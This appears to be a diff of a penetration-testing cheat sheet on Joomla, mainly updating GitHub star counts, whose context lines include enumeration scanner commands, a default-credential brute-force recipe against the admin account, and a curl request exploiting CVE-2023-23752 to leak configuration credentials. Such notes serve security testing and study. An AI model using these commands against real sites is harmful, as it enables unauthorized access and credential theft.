@@ -6,7 +6,7 @@
 
 [Joomla](https://www.joomla.org/) is an open-source Content Management System (CMS) written in PHP. The version 5 is currently in development (2024).
 
-* [GitHub](https://github.com/joomla/joomla-cms) <small>(4.4k ⭐)</small>
+* [GitHub](https://github.com/joomla/joomla-cms) <small>(4.9k ⭐)</small>
 * [Documentation](https://docs.joomla.org/) <small>(⛪)</small>
 
 You can see the repartition of active Joomla installations [here](https://developer.joomla.org/stats/cms_version).
@@ -32,7 +32,7 @@ It some versions, we may be able to access `/administrator/manifests/files/jooml
 $ curl [...].xml | xmllint --format -
 ```
 
-* OWASP initiated the development of [joomscan](https://github.com/OWASP/joomscan) <small>(1.0k ⭐)</small>
+* OWASP initiated the development of [joomscan](https://github.com/OWASP/joomscan) <small>(1.1k ⭐)</small>
 
 ```ps
 $ sudo apt install joomscan
@@ -50,10 +50,10 @@ $ droopescan scan joomla --url URL
 <SNIP... Nothing of interest>
 ```
 
-* You can try to use [JoomlaScan](https://github.com/drego85/JoomlaScan) <small>(0.1k ⭐, 2022 🪦)</small>
+* You can try to use [JoomlaScan](https://github.com/drego85/JoomlaScan) <small>(0.2k ⭐, 2022 🪦)</small>
 </div><div>
 
-* Default username: `admin`. Password set at install time. You can test default credentials using [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce) <small>(0.02k ⭐, 2020 🪦)</small> while you should not use it for brute force <small>(it sucks...)</small>.
+* Default username: `admin`. Password set at install time. You can test default credentials using [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce) <small>(0.1k ⭐, 2020 🪦)</small> while you should not use it for brute force <small>(it sucks...)</small>.
 
 ```shell!
 $ wget https://github.com/ajnik/joomla-bruteforce/raw/master/joomla-brute.py
@@ -61,7 +61,7 @@ $ cp /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt .
 $ python joomla-brute.py -u URL -w http_default_pass.txt --username admin -v
 ```
 
-* [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752): Exposed credentials `[4.0.0, 4.2.7]`. See also: [PoC (ruby)](https://github.com/Acceis/exploit-CVE-2023-23752) <small>(0.05k ⭐)</small> or manual exploitation:
+* [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752): Exposed credentials `[4.0.0, 4.2.7]`. See also: [PoC (ruby)](https://github.com/Acceis/exploit-CVE-2023-23752) <small>(0.1k ⭐)</small> or manual exploitation:
 
 ```ps
 $ curl -v URL/api/index.php/v1/config/application?public=true
